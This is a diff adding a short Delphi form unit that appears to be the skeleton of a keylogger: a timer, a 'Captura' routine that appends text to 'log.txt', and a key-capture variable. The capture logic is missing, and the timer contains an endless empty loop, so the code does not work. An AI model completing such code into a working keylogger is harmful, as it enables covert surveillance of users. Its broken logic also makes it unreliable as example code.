@@ -1,0 +1,75 @@
+unit aplicacao;
+
+interface
+
+uses
+  Winapi.Windows,
+  Winapi.Messages,
+  System.SysUtils,
+  System.Variants,
+  System.Classes,
+  Vcl.Graphics,
+  Vcl.Controls,
+  Vcl.Forms,
+  Vcl.Dialogs,
+  Vcl.ExtCtrls;
+
+type
+  TForm1 = class( TForm )
+    Timer1: TTimer;
+    procedure FormCreate( Sender: TObject );
+    procedure FormDestroy( Sender: TObject );
+    procedure Timer1Timer( Sender: TObject );
+  private
+    { Private declarations }
+  public
+    { Public declarations }
+    Arq: TextFile;
+    Str: string;
+    procedure Encerrar;
+    function Captura( Txt: string ): string;
+
+  end;
+
+var
+  Form1: TForm1;
+
+implementation
+
+{$R *.dfm}
+
+
+function TForm1.Captura( Txt: string ): string;
+begin
+  Rewrite( Arq );
+  Str := Str + Txt;
+  Write( Arq, Str );
+end;
+
+procedure TForm1.Encerrar;
+begin
+  Self.FreeInstance;
+end;
+
+procedure TForm1.FormCreate( Sender: TObject );
+begin
+  AssignFile( Arq, 'log.txt' );
+  Str := '';
+end;
+
+procedure TForm1.FormDestroy( Sender: TObject );
+begin
+  CloseFile( Arq );
+end;
+
+procedure TForm1.Timer1Timer( Sender: TObject );
+var
+  KeyCapturada, KeyResult: Integer;
+begin
+  KeyCapturada := 0;
+  repeat
+
+  until KeyCapturada = 255;
+end;
+
+end.
